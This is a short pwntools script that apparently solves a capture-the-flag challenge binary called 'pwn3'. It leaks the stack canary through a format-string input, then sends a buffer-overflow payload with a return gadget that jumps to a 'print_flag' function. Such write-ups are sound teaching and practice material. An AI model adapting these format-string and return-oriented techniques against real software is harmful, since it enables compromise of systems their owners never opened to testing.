#!/usr/bin/python3

from pwn import *

exe = ELF('./pwn3', checksec=False)

r = process(exe.path)
# Step 1: leak_canary
r.sendlineafter(b'Insert your name: ', b'%15$p')

r.recvuntil(b'Welcome home ')
canary = int(r.recvline()[:-1], 16)
print('[*]', hex(canary))

r.sendlineafter(b'first surname: ', b'any')

# Step 2: buffer overflow

payload = b'a'*40+p64(canary)
payload += p64(0) 
payload += p64(0x401016) # gadget return 
payload += p64(exe.sym['print_flag'])

r.sendlineafter(b'second surname: ', payload)



r.interactive()